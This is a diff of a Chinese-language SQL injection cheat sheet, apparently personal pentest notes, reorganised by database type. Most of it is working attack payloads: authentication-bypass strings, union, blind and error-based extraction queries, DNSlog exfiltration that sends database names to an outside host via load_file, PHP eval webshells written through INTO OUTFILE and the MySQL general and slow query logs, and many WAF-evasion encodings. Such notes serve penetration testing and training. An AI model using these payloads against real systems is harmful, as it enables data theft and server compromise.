@@ -11,36 +11,12 @@
 # 大纲
 
 * [注入检测](#注入检测)
-
-* [注入类型](#注入类型)
-    * [基于响应类型](#基于响应类型)
-        * [报错](#报错)
-        * [联合查询](#联合查询)
-        * [堆叠注入](#堆叠注入)
-        * [盲注](#盲注)
-            * [基于布尔](#基于布尔)
-            * [基于时间](#基于时间)
-    * [基于数据类型](#基于数据类型)
-        * [字符型](#字符型)
-        * [数字型](#数字型)
-        * [搜索型](#搜索型)
-    * [基于语句类型](#基于语句类型)
-        * [插入型](#插入型)
-        * [删除型](#删除型)
-    * [基于程度和顺序](#基于程度和顺序)
-        * [一阶注入](#一阶注入)
-        * [二阶注入](#二阶注入)
-    * [基于注入点的位置](#基于注入点的位置)
-        * [UA注入](#ua注入)
-
-* [数据库类型](#数据库类型)
-    * [MySQL](#mysql)
-    * [MSSQL](#mssql)
-    * [Oracle](#oracle)
-
-* [绕过技巧](#绕过技巧)
-    * [MYSQL](#mysql)
-    * [sqlserver](#sqlserver)
+* [MySQL](#mysql)
+* [MSSQL](#mssql)
+* [Oracle](#oracle)
+* H2 database
+* [BigQuery](#bigquery)
+* [SQLite](#sqlite)
 
 ---
 
@@ -57,16 +33,15 @@
 - https://juice-shop.herokuapp.com/#/search
 - https://sqlchop.chaitin.cn/demo/
 
-**靶场**
-- [sqli-labs](../靶场/sqli-labs-WalkThrough.md)
-
 **辅助工具**
 - sqlmap
     - [sqlmap 笔记](../../../安全工具/Sqlmap.md)
 - [TheKingOfDuck/MySQLMonitor](https://github.com/TheKingOfDuck/MySQLMonitor) - MySQL 实时监控工具(代码审计/黑盒/白盒审计辅助工具)
 
-**常用语句**
-- [Mysql常用语句](../../../../Integrated/数据库/笔记/Mysql常用语句.md)
+**提权工具**
+- [SafeGroceryStore/MDUT](https://github.com/SafeGroceryStore/MDUT) - 数据库跨平台利用工具
+- [Ryze-T/Sylas](https://github.com/Ryze-T/Sylas) - 数据库综合利用工具
+    - https://paper.seebug.org/1836/
 
 ---
 
@@ -178,6 +153,18 @@
 
 > 注：True 或 False 语句应通过 HTTP 状态码或 HTML 内容返回不同的响应。如果这些响应与查询的 True/False 性质一致，则表示存在注入。
 
+- 万能密码
+    ```
+    admin' --
+    admin' #
+    admin'/*
+    ' or 1=1--
+    ' or 1=1#
+    ' or 1=1/*
+    ') or '1'='1--
+    ') or ('1'='1--
+    ' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--
+    ```
 - 逻辑测试
     - 1.php?id=1 or 1=1     -- true
     - 1.php?id=1' or 1=1    -- true
@@ -198,360 +185,173 @@
 
 ---
 
-## 注入类型
+## MYSQL
 
-### 基于响应类型
-
-#### 报错
-
-**floor() rand() group by**
-```sql
-Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a;
--- 处有三个点，一是需要 concat 计数，二是 floor，取得 0 or 1，进行数据的重复，三是 group by 进行分组，但具体原理解释不是很通，大致原理为分组后数据计数时重复造成的错误。也有解释为 mysql 的 bug 的问题。但是此处需要将 rand(0)，rand() 需要多试几次才行。
-
--- 以上语句可以简化成如下的形式。
-select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2))
-
--- 如果关键的表被禁用了，可以使用这种形式
-select count(*) from (select 1 union select null union
-select !1) group by concat(version(),floor(rand(0)*2))
-
--- 如果 rand 被禁用了可以使用用户变量来报错
-select min(@a:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2)
-```
-
-**double 数值类型超出范围**
-- https://www.cnblogs.com/lcamry/articles/5509124.html
-
-```sql
-select exp(~(select * FROM(SELECT USER())a))
-```
-
-**bigint 溢出**
-- https://www.cnblogs.com/lcamry/articles/5509112.html
-
-```sql
-select !(select * from (select user())x) -
-```
-
-**xpath 函数报错注入**
-
-- **updatexml()**
-
-    updatexml 在执行时，第二个参数应该为合法的 XPATH 路径，否则会在引发报错的同时将传入的参数进行输出
-
-    构造方式 ：`http://url?id=1' or updatexml(1,concat(0x7e,(select 字段 from 表名)),1)#`
-    ```sql
-    updatexml(1,concat(0x3a,(select database())),1)
-    ```
-
-- **extractvalue()**
-
-    ```sql
-    extractvalue(1,concat(0x7e,(select database()),0x7e))
-    ```
-
-**重复特性**
-```sql
-select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;
--- mysql 重复特性，此处重复了 version，所以报错。
-```
-
----
-
-#### 联合查询
-
-**union**
-```sql
--- 查询数据库信息
-union select 1,database()
---查询所有数据库名
-union SELECT group_concat(schema_name),2 FROM INFORMATION_SCHEMA.SCHEMATA
---爆出所有数据库
-SELECT group_concat(schema_name) FROM INFORMATION_SCHEMA.SCHEMATA
---查数据库名为fanke下面的表名(16进制编码)
-union select 1,table_name,3,4,5 from information_schema.tables where table_schema=0x66616E6B65
-
--- 查user表名下的列名信息
-union select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_name=0x75736572
-    -- column_name：列名
--- 查user表名下列名username,password的数据
-union select 1,username,password,4,5 from user
-```
-
----
-
-#### 堆叠注入
-
-
-
-
----
-
-#### 盲注
+**靶场**
+- https://github.com/Audi-1/sqli-labs
+    - [sqli-labs](../靶场/sqli-labs-WalkThrough.md)
 
 **相关文章**
-- [sql 盲注之正则表达式攻击](https://www.cnblogs.com/lcamry/articles/5717442.html)
-- [MYSQL注入天书之盲注讲解](https://www.cnblogs.com/lcamry/p/5763129.html)
-
-##### 基于布尔
-
-**Left()**
-```sql
--- 爆库名
-left(database(),1)>'a'      -- 查看数据库名第一位
-left(database(),1)>'s'      -- left(a,b)从左侧截取a的前b位
-left(database(),2)>'ab'     -- 查看数据库名前二位。
--- 同样的 string 可以为自行构造的 sql 语句。
-```
-
-**Substr()**
-```sql
--- 爆库名
-substr(DATABASE(),1,1)>'a'  -- 查看数据库名第一位
-substr(DATABASE(),2,1)      -- 查看数据库名第二位，依次查看各位字符
-substr((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1,1)>'a'          -- 此处 string 参数可以为 sql 语句，可自行构造 sql 语句进行注入。
-```
-
-**ascii()**
-```sql
--- 库名长度判断
-ascii(substr(database(),1,1))>1
-
--- 爆库名
-ascii(substr((select table_name from information_schema.tables where tables_schema=database()limit 0,1),1,1))=101 --+    -- substr(a,b,c)从b位置开始，截取字符串a的c长度。Ascii()将某个字符转换为ascii值
-
-ascii(substr((select database()),1,1))=98
-```
-
-**length()**
-```sql
--- 库名长度判断
-length(database())>1
-```
-
-**mid()**
-```sql
--- 爆库名
-MID(DATABASE(),1,1)>'a' -- 查看数据库名第一位
-MID(DATABASE(),2,1)     -- 查看数据库名第二位，依次查看各位字符。
-
-MID((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1,1)>'a'           -- 此处 column_name 参数可以为 sql 语句，可自行构造 sql 语句进行注入。
-```
-
-**ord()**
-```sql
--- 爆库名
-ORD(MID(DATABASE(),1,1))>114
-ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))>98%23
-```
-
-**regexp()**
-```sql
--- 爆用户
-1 and 1=(if((user() regexp '^[a-z]'),1,0));
--- user()结果为root，regexp为匹配root的正则表达式。
-1 and 1=(if((user() regexp '^r[a-z]'),1,0));
-
--- 爆 security 库的表名
-1 and 1=(select 1 from information_schema.tables where table_schema='security' and table_name regexp '^us[a-z]' limit 0,1);
--- '^u[a-z]' -> '^us[a-z]' -> '^use[a-z]' -> '^user[a-z]' -> FALSE
-```
-
-table_name 有好几个，我们只得到了一个 user，如何知道其他的？
-
-这里可能会有人认为使用 limit 0，1 改为 limit 1,1。
-
-但是这种做法是错误的，limit 作用在前面的 select 语句中，而不是 regexp。那我们该如何选择。其实在 regexp 中我们是取匹配 table_name 中的内容，只要 table_name 中有的内容，我们用 regexp 都能够匹配到。因此上述语句不仅仅可以选择 user，还可以匹配其他项。
-
-**like**
-
-和 regexp 类似，mysql 在匹配的时候我们可以用 like 进行匹配。
-```sql
--- 爆用户
-1 and 1=(select user() like 'r%')
-1 and 1=(select user() like 'ro%')
-```
-
-##### 基于时间
-
-**sleep()**
-```sql
-If(ascii(substr(database(),1,1))>115,0,sleep(5)) %23
--- if判断语句，条件为假，执行 sleep
-```
-
-**benchmark()**
-```sql
-UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE('MSG','by 5 seconds')),null) FROM (select database() as current) as tb1;
--- BENCHMARK(count,expr)用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的cpu资源。推荐使用sleep()
-```
-
----
-
-### 基于数据类型
-
-#### 字符型
-
-**宽字节注入**
-
-- 1.php?id='1%df反斜杠' (其中反斜杠为%5c,%df%5c在GBK编码下可以变成'蓮' 类似于这个字) 变成 1.php?id='1蓮'
-- 将 \' 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉。
-- 宽字节注入的修复方案
-
-**URLDecode二次注入**
-
-- 浏览器编码完之后WebServer会自动解码的，如果后端程序误用urldecode函数会造成此类情况(1.php?id=1%2527==>(WebServer)1.php?id=1%27==>(urldecode)1.php?id=1')
-
-#### 数字型
-
-
-
-
-
-
-
-
-
-
-#### 搜索型
-
-
-
-
-
-
-
-
-### 基于语句类型
-
-#### 插入型
-
-
-
-
-
-
-
-#### 删除型
-
-
-
-
-
-
-
-
----
-
-### 基于程度和顺序
-
-#### 一阶注入
-
-
-
-
-
-
-#### 二阶注入
-
-**案例**
-- [WooYun-2015-157024 百度某系统SQL注入到Getshell](https://php.mengsec.com/bugs/wooyun-2015-0157024.html)
-
----
-
-### 基于注入点的位置
-
-#### UA注入
-
-**相关文章**
-- [User Agent注入攻击及防御](https://www.jianshu.com/p/99fbb931c4b4)
-
-**案例**
-- [m.17u.cn一处SQL注入](https://sec.ly.com/bugdetail?id=009063229194078153174131073236159115161105151152)
-
----
-
-## 攻击类型
-
-### 导入导出
-
-**相关文章**
-- [MYSQL注入天书之导入导出介绍](https://www.cnblogs.com/lcamry/p/5763111.html)
-
-### 导出文件
-
-**load_file()**
-
-条件:
-1. 必须有权限读取并且文件必须完全可读
-2. 读取文件必须在服务器上
-3. 必须指定文件完整的路径
-4. 读取文件必须小于 max_allowed_packet
-
-如果该文件不存在，或因为上面的任一原因而不能被读出，函数返回空。比较难满足的就是权限，在 windows 下，如果 NTFS 设置得当，是不能读取相关的文件的，当遇到只有 administrators 才能访问的文件，users 就别想 load_file 出来。
-
-```sql
-Select 1,2,3,4,5,6,7,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92,114,101,112,97,105,114,92,115,97,109))))
-
--1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))
--- Explain："char(99,58,47,98,111,111,116,46,105,110,105)"就是"c:/boot.ini"的ASCII代码
-
--1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69)
--- Explain："c:/boot.ini"的16进制是"0x633a2f626f6f742e696e69"
-
--1 union select 1,1,1,load_file(c:\\boot.ini)
--- Explain:路径里的/用 \\代替
-```
-
-### 导入到数据库
-
-**LOAD DATA INFILE**
-
-在注入过程中，我们往往需要一些特殊的文件，比如配置文件，密码文件等。当你具有数据库的权限时，可以将系统文件利用 load data infile 导入到数据库中。
-
-```sql
-load data infile '/tmp/t0.txt' ignore into table t0 character set gbk fields terminated by '\t' lines terminated by '\n'
--- 将 /tmp/t0.txt 导入到 t0 表中，character set gbk 是字符集设置为 gbk，fields terminated by 是每一项数据之间的分隔符，lines terminated by 是行的结尾符。
-```
-
-当错误代码是 2 的时候的时候，文件不存在，错误代码为 13 的时候是没有权限，可以考虑 /tmp 等文件夹。
-
-### 导入到文件
-
-**SELECT.....INTO OUTFILE 'file_name'**
-
-可以把被选择的行写入一个文件中。该文件被创建到服务器主机上，因此你必须拥有 FILE 权限，才能使用此语法。file_name 不能是一个已经存在的文件。
-```sql
-Select  <?php @eval($_post["mima"])?>  into outfile "c:\\phpnow\\htdocs\\test.php"
-
-Select version() Into outfile "c:\\phpnow\\htdocs\\test.php" LINES TERMINATED BY 0x16进制文件
--- 通常是用'\r\n'结尾，此处我们修改为自己想要的任何文件。同时可以用FIELDS TERMINATED BY
-```
-
----
-
-## 数据库类型
-
-找出目标数据库的具体类型对于 SQL 注入非常关键。
-
-> 注意：注释字符 -- 放置在查询后面，以删除查询后面的任何命令，有助于防止出现错误。
-
-### MySQL
-
-> PHP应用程序通常具有MySQL数据库。
+- [Mysql注入-Bypass啊理芸](https://mp.weixin.qq.com/s/0gjgPz2QfNC0Y6_AL6JV_Q)
+- [SQL注入-bypass A某Yun的tamper](https://mp.weixin.qq.com/s/vjbQT41O4MSPoZY9fej_cw)
+- [SQL注入之利用DNSlog外带盲注回显](https://blog.csdn.net/u014029795/article/details/105214129)
+- [mysql写shell的一点总结](https://v0w.top/2020/03/14/mysql-getshell/)
+- [MySql慢查询日志GetShell](https://www.t00ls.cc/articles-52118.html)
+- [MySql报错注入-高版本json函数报错](https://mp.weixin.qq.com/s/g0wwDcxrcOYXs-lYTrc8Cw)
 
 **资源**
 - [aleenzz/MSSQL_SQL_BYPASS_WIKI](https://github.com/aleenzz/MSSQL_SQL_BYPASS_WIKI)
 
+### MySQL 基础
+
+- [Mysql函数](../../../../Integrated/数据库/笔记/Mysql函数.md)
+- [Mysql常用语句](../../../../Integrated/数据库/笔记/Mysql常用语句.md)
+
 **注释**
+
 ```sql
---
-#
-/* */ 多行注释
+#       注释内容，表示单行注释
+--      注意--后面有一个空格
+/* */   多行注释
 ```
 
-**正则表达式攻击**
+**数据库名**
+
+```sql
+SELECT database();
+SELECT schema_name FROM information_schema.schemata;
+```
+
+**表名**
+
+```sql
+SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema!='information_schema' AND table_schema!='mysql';
+
+-- union 查询
+--MySQL 4版本时用version=9，MySQL 5版本时用version=10
+UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10;   /* 列出当前数据库中的表 */
+UNION SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=database();   /* 列出所有用户自定义数据库中的表 */
+
+-- 盲注
+AND select SUBSTR(table_name,1,1) from information_schema.tables where table_schema=database() > 'A'
+
+-- 报错
+AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2))) (@:=1)||@ GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),!@) HAVING @||MIN(@:=0); AND ExtractValue(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1)));
+-- 在5.1.5版本中成功。
+```
+
+**列名**
+
+```sql
+-- union 查询
+UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'tablename'
+
+-- 盲注
+AND select substr((select column_name from information_schema.columns where table_schema=database() and table_name = 'tablename' limit 0,1),1,1) > 'A'
+
+-- 报错
+-- 在5.1.5版本中成功
+AND (1,2,3) = (SELECT * FROM SOME_EXISTING_TABLE UNION SELECT 1,2,3 LIMIT 1)
+-- MySQL 5.1版本修复了
+AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),FLOOR(RAND(0)*2))) (@:=1)||@ GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),!@) HAVING @||MIN(@:=0); AND ExtractValue(1, CONCAT(0x5c, (SELECT column_name FROM information_schema.columns LIMIT 1)));
+
+-- 利用 PROCEDURE ANALYSE()
+-- 这个需要 web 展示页面有你所注入查询的一个字段
+-- 获得第一个段名
+SELECT username, permission FROM Users WHERE id = 1; 1 PROCEDURE ANALYSE()
+-- 获得第二个段名
+1 LIMIT 1,1 PROCEDURE ANALYSE()
+-- 获得第三个段名
+1 LIMIT 2,1 PROCEDURE ANALYSE()
+```
+
+**根据列名查询所在的表**
+
+```sql
+-- 查询字段名为 username 的表
+SELECT table_name FROM information_schema.columns WHERE column_name = 'username';
+-- 查询字段名中包含 username 的表
+SELECT table_name FROM information_schema.columns WHERE column_name LIKE '%user%';
+```
+
+**条件语句**
+
+```sql
+SELECT IF(1=1, true, false);
+SELECT CASE WHEN 1=1 THEN true ELSE false END;
+```
+
+**延时函数**
+
+```sql
+SELECT sleep(3)
+
+UNION SELECT If(ascii(substr(database(),1,1))>115,0,sleep(5))
+
+SELECT BENCHMARK(100000,SHA1('true'))
+
+UNION SELECT IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1('true')), false)
+```
+
+**order by 后的注入**
+
+order by 由于是排序语句，所以可以利用条件语句做判断，根据返回的排序结果不同判断条件的真假。一般带有 order 或者 order by 的变量很可能是这种注入，在知道一个字段的时候可以采用如下方式注入：
+```sql
+http://www.test.com/list.php?order=vote
+
+-- 根据 vote 字段排序。找到投票数最大的票数 num 然后构造以下链接：
+
+http://www.test.com/list.php?order=abs(vote-(length(user())>0)*num)+asc
+
+-- 看排序是否变化。还有一种方法不需要知道任何字段信息，使用 rand 函数：
+
+http://www.test.com/list.php?order=rand(true)
+http://www.test.com/list.php?order=rand(false)
+
+-- 以上两个会返回不同的排序，判断表名中第一个字符是否小于 128 的语句如下：
+
+http://www.test.com/list.php?order=rand((select char(substring(table_name,1,1)) from information_schema.tables limit 1)<=128))
+```
+
+**宽字节注入**
+
+国内最常使用的 GBK 编码，这种方式主要是绕过 addslashes 等对特殊字符进行转移的绕过。反斜杠 \ 的十六进制为 %5c，在你输入 %bf%27 时，函数遇到单引号自动转移加入 \，此时变为 %bf%5c%27，%bf%5c 在 GBK 中变为一个宽字符「縗」。%bf 那个位置可以是 %81-%fe 中间的任何字符。不止在 SQL 注入中，宽字符注入在很多地方都可以应用。
+
+**oob**
+
+```sql
+select load_file('\\\\test.xxx.ceye.io\\abc');
+
+select load_file(concat('\\\\',(select hex(database()),'.xxx.ceye.io\\abc'));
+/*
+UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器.。UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。UNC路径就是类似\softer这样的形式的网络路径
+
+格式： \servername\sharename ，其中 servername 是服务器名，sharename 是共享资源的名称。
+目录或文件的 UNC 名称可以包括共享名称下的目录路径，格式为：\servername\sharename\directory\filename
+
+上面的 payload 中 \\\\ 转义后即为 \\
+select hex(database()) 为需要的查询语句，用 hex() 是因为构造 UNC 时不能有特殊符号，转化一下更好用。
+.xxx.ceye.io\\abc 转义后就变成了 .xxx.ceye.io\abc
+拼接起来后就成了 \\xxx.ceye.io\abc 完全符合 UNC 的路径标准，解析后在 DNSlog 平台就能看到数据了。
+Linux 没有 UNC 路径，所以当处于 Linux 系统时，不能使用该方式获取数据
+/*
+```
+
+如果不成功,可能是访问 oob 域名的流量被拦截了,也可能是由于没开启文件导入导出
+```sql
+show global variables like '%secure%';
+
+-- 如果secure_file_priv的值为null，则没开启；如果为空，则开启；如果为目录，则说明只能在该目录下操作。
+-- 通过设置my.ini来配置
+```
+
+**文件导出**
+
+```sql
+select '<? phpinfo(); ?>' into outfile 'D:/shell.php';
+```
+
+### 正则表达式攻击
 
 在 MYSQL 5+ 中 information_schema 库中存储了所有的库名，表名以及字段名信息。
 
@@ -597,27 +397,302 @@ select * from users where id=1 and 1=(select 1 from information_schema.tables wh
 
 实验表名：在 limit 0,1 下，regexp 会匹配所有的项。我们在使用 regexp 时，要注意有可能有多个项，同时要一个个字符去爆破。类似于上述第一条和第二条。而 limit 0,1 对于 where table_schema='security' limit 0,1 来说 table_schema='security' 已经起到了限定作用了，limit 有没有已经不重要了。
 
+### 日志 getshell
+
+查询当前 mysql 下 log 日志的默认地址，同时也看下 log 日志是否为开启状态，并且记录下原地址，方便后面恢复。
+```sql
+-- 开启日志监测，一般是关闭的，如果一直开，文件会很大的。
+set global general_log = on;
+
+-- 这里设置我们需要写入的路径就可以了。
+set global general_log_file = 'D:/shell.php';
+
+-- 查询一个一句话，这个时候log日志里就会记录这个。
+select '<?php eval($_POST['1']);?>';
+```
+
+```sql
+-- 结束后，再修改为原来的路径。
+set global general_log_file = 'D:\xampp\mysql\data\1.log';
+
+-- 关闭下日志记录。
+set global general_log = off;
+```
+
+#### 慢查询日志
+
+MySQL 的慢查询日志是 MySQL 提供的一种日志记录，它用来记录在 MySQL 中响应时间超过阀值的语句。
+
+对日志量庞大，直接访问日志网页极有可能出现 500 错误。通过开启慢查询日志，记录了超时 10s 的 SQL，这样页面的代码量会减轻很多不易导致 500, 配置可解析日志文件 GETSHELL。
+```sql
+show variables like '%slow%';
+```
+long_query_time 的默认值为 10，意思是运行 10S 以上的语句。该值可以指定为微秒的分辨率。具体指运行时间超过 long_query_time 值的 SQL，则会被记录到慢查询日志中。
+
+```sql
+set GLOBAL slow_query_log_file='C:/phpStudy/PHPTutorial/WWW/slow.php';
+set GLOBAL slow_query_log=on;
+set GLOBAL log_queries_not_using_indexes=on;
+```
+
+```sql
+select '<?php phpinfo();?>' from mysql.db where sleep(10);
+```
+
+### bypass 技巧
+
+**常见的绕过技巧**
+
+```
+# 双写
+❌ select
+✔ seselectlect
+
+# 大小写
+❌ select
+✔ SElect
+
+# 负数
+❌ ?id=1 ANd 1=1
+✔ ?id=1 ANd -1=-1
+
+# 小数点
+❌ WHERE id= '1'
+✔ WHERE id= '1.0test'
+
+# +号连接绕过
+❌ ?id=1 ANd 1=1
+✔ ?id=1+and+1=1
+✔ ?id=1+union+select+1+2
+
+# 无闭合
+❌ ?id=1 and 1=1
+✔ ?id=1 --+/*%0aand 1=1 --+*/
+
+# 有闭合
+❌ ?id=1 and 1=1
+✔ ?id=1 --+/*%0a'and 1=1 --+ --+*/
+✔ ?id=1 --+/*%0aand 1=1 --+*/
+✔ ?id=1 --+/*%0a'and 1=1 --+ --+*
+
+# %09、%0a、%0b、%0c、%0d、%a0 替换 %20
+❌ and false union select 1,2,......,31--
+✔ and%0afalse%0aunion%0aselect%0a1,2,......,31--+
+
+# URL 编码
+❌ ?id=1 union select pass from admin limit 1
+✔ 1%20union%20select%20pass%20from%20admin%20limit%201
+
+❌ ?id=1 or 1
+✔ ?id=1%27or%271           #字符型注入
+✔ ?id=1%20or%201           #数字型注入
+```
+
+**函数替换**
+- 连接
+    ```sql
+    and length(database())=7
+    && length(database())=7
+    %26%26 length(database())=7
+    HAVING length(database())=7
+
+    or 1=1
+    || 1=1
+    %7C%7C 1=1
+    %7C%7C 1 LIKE 1
+    ```
+
+- benchmark 代替 sleep
+    ```sql
+    id=1 and if(ascii(substring((database()),1,1))=115,(select benchmark(1000000,md5(0x41))),1) --+
+    ```
+
+- 字符串截取函数
+    ```sql
+    Mid(version(),1,1)
+    Substr(version(),1,1)
+    Substring(version(),1,1)
+    Lpad(version(),1,1)
+    Rpad(version(),1,1)
+    Left(version(),1)
+    reverse(right(reverse(version()),1))
+    ```
+
+- 字符串连接函数
+    ```sql
+    concat(version(),'|',user());
+    concat_ws('|',1,2,3)
+    ```
+
+- 字符转换/编码
+    ```
+    Char(49)
+    Hex(‘a’)
+    Unhex(61)
+    Ascii(1)
+    ```
+
+**函数与括号之间**
+
+```
+# 函数与括号之间可添加空格、换行、注释
+❌ select version()
+✔ select version ()
+✔ select version/**/()
+✔ select version
+#123
+()
+```
+
+**执行语句之间**
+
+```
+# 执行语句之间的空格，可用注释符、"换行%0a"替换
+❌ select version()
+✔ select/**/version()
+✔ select#123
+version()
+✔ select-- 123
+version()
+```
+
+**括号包裹**
+
+```
+# 逻辑判断式1>1、'a'='b'，from后的表格名，select语句，可用括号包裹
+✔ select * from (test)
+✔ select * from (test) where (id=1)
+✔ select * from (test) where (id=1) union (select * from (test) where (id=2));
+```
+
+**省略空格**
+
+```
+# 单双引号'"、括号()、反单引号``、星号*、与语句之间可以没有空格
+✔ select*from(test)
+✔ select*from(test)where(id=1)
+✔ select*from(test)where(id=1)union(select*from(test)where(id=2));
+```
+
+**注释配合换行符**
+
+```
+# order by 1
+❌ ?id=1'order by id#
+✔ ?id=1%27order%20by%20id%23
+✔ ?id=1%27order%23/*%99%0aby%23/*%99%0a4%23
+✔ ?id=1%20order%23/*%99%0aby%23/*%99%0aid%23
+✔ ?id=1%20order%23/*%99%0aby%23/*%99%0a4%23
+
+# union select x from x
+❌ ?id=union select
+✔ ?id=union%23/*%99%0aselect
+✔ ?id=union--%20%0d%0a%23/*%99%0aselect
+✔ ?id=union--%20%0d%0a%23/*%99%0aselect--%20%0d%0a%23/*%99%0aa,2,asd
+✔ ?id=union--%20%0d%0a%23/*%99%0aselect--%20%0d%0a%23/*%99%0a1,id,3%20from%20users
+✔ ?id=1%27union--%20%0d%0a%23/*%99%0aselect--%20%0d%0a%23/*%99%0a1,id,3%20from%20users%23%27
+✔ ?id=1%20union--%20%0d%0a%23/*%99%0aselect--%20%0d%0a%23/*%99%0a1,id,3%20from%20users%23
+✔ ?id=1%27union--%20%0d%0a%23/*%99%0aselect--%20%0d%0a%23/*%99%0a1,%23/*%99%0auser(),3%20from%20users%23
+
+# load_file()
+# 规避常规的 dnslog 站点, 最好自建 dnslog 服务
+❌ ?id=1'union select load_file("//123.xxx.com/abc")#
+✔ ?id=1%27union--%20%0d%0a%23/*%99%0aselect--%20%0d%0a%23/*%99%0aload_file(%22//123.xxx.com/abc%22)%23
+✔ ?id=1%27%26%26(--%20%0d%0a%23/*%99%0aselect--%20%0d%0a%23/*%99%0aload_file(%22//123.xxx.cn/abc%22))%23
+✔ ?id=1%27%26%26(--%20%0d%0a%23/*%99%0aselect--%20%0d%0a%23/*%99%0aload_file(%23/./%23/*%99%0a))%23
+✔ ?id=1%27%26%26(--%20%0d%0a%23/*%99%0aselect--%20%0d%0a%23/*%99%0aload_file(%23/./%23/*%99%0d%0aconcat(%27//%27,(%23%0aselect%23/*%99%0a111),%27.123.text.com/abc%27)))%23
+✔ ?id=1%20%26%26(--%20%0d%0a%23/*%99%0aselect--%20%0d%0a%23/*%99%0aload_file(%23/./%23/*%99%0d%0aconcat(%27//%27,(%23%0aselect%23/*%99%0a111),%27.123.text.com/abc%27)))%23
+
+# concat()
+❌ ?id=concat('//',(select 123),".123.test.com/abc")
+✔ ?id=concat(%27//%27,(select%23/*%99%0a123),%22.123.test.com/abc%22)
+
+# updatexml()
+❌ ?id=updatexml(1,1,1)
+✔ ?id=updatexml%23/*%99%0a(1,1,1)
+✔ ?id=1%27and%20updatexml%23/*%99%0a(1,1,1)%23%27
+✔ ?id=1%20and%20updatexml%23/*%99%0a(1,1,1)
+
+❌ ?id=updatexml(0,(select a),'a)')
+✔ ?id=updatexml%23/*%99%0d%0a(0,(%23/*%99%0d%0aselect%0aa),%27a)%27)
+✔ ?id=1%27%26%26updatexml%23/*%99%0d%0a(0,(%23%0aselect%23/*%99%0a111),%27a)%27)%23
+✔ ?id=1%20and%20updatexml%23/*%99%0d%0a(0,(%23%0aselect%23/*%99%0a111),%27a)%27)%23
+
+?id=1' and updatexml(0,concat#concat)('//~',(select 123),0x7e),'a)')#
+?id=1%27%26%26updatexml%23/*%99%0d%0a(0,concat%0a%23concat)%0d%0a(%27//~%27,(select%23/*%99%0a123),0x7e),%27a)%27)%23
+?id=1%20and%20updatexml%23/*%99%0d%0a(0,concat%0a%23concat)%0d%0a(%27//~%27,(select%23/*%99%0a123),0x7e),%27a)%27)%23
+```
+
+**绕过引号限制**
+```sql
+-- hex 编码
+SELECT * FROM Users WHERE username = 0x61646D696E
+-- char() 函数
+SELECT * FROM Users WHERE username = CHAR(97, 100, 109, 105, 110)
+```
+
+**绕过字符串黑名单**
+```sql
+SELECT 'a' 'd' 'mi' 'n';
+SELECT CONCAT('a', 'd', 'm', 'i', 'n');
+SELECT CONCAT_WS('', 'a', 'd', 'm', 'i', 'n');
+SELECT GROUP_CONCAT('a', 'd', 'm', 'i', 'n');
+
+-- 使用 CONCAT() 时，任何个参数为 null，将返回 null，可以使用 CONCAT_WS()。CONCAT_WS()函数第一个参数表示用哪个字符间隔所查询的结果。
+```
+
+**json 函数**
+
+MySQL 5.7.8 开始新增了很多操作 json 数据的函数
+
+```sql
+JSON_TYPE()
+-- 此函数获取JSON值的类型，当我们传入的值不属于json格式则报错。
+JSON_TYPE(version())
+
+JSON_EXTRACT()
+-- 此函数从 JSON 文档中返回数据，从与path参数匹配的文档部分中选择,当第一个参数不是json类型的值则报错
+JSON_EXTRACT(version(), '$[1]')
+JSON_EXTRACT((select user()),'$.a')
+
+JSON_ARRAY_APPEND()
+-- 将值附加到 JSON 文档中指定数组的末尾并返回结果，报错输出原理和json_extract函数相同。
+select JSON_ARRAY_APPEND(version(),1,1);
+select JSON_ARRAY_APPEND('[1,2]',version(),1);
+```
+
 ---
 
-### MSSQL
+## MSSQL
 
-> 基于ASP / ASPX的应用程序一般都是MSSQL。
+> 基于ASP / ASPX的应用程序一般都是 MSSQL。
 
-**资源**
+**学习资源**
 - [aleenzz/MYSQL_SQL_BYPASS_WIKI](https://github.com/aleenzz/MYSQL_SQL_BYPASS_WIKI)
+
+**靶场**
+- [Larryxi/MSSQL-SQLi-Labs](https://github.com/Larryxi/MSSQL-SQLi-Labs)
+
+**相关文章**
+- [SQL Server从0到1](https://mp.weixin.qq.com/s/N2siXJgmPAZ7CSIQ3FCF0w)
+
+**相关案例**
+- [记一次苦逼的sql注入](https://mp.weixin.qq.com/s/ydzMtlJfWD4hixIo1_ul2A)
+
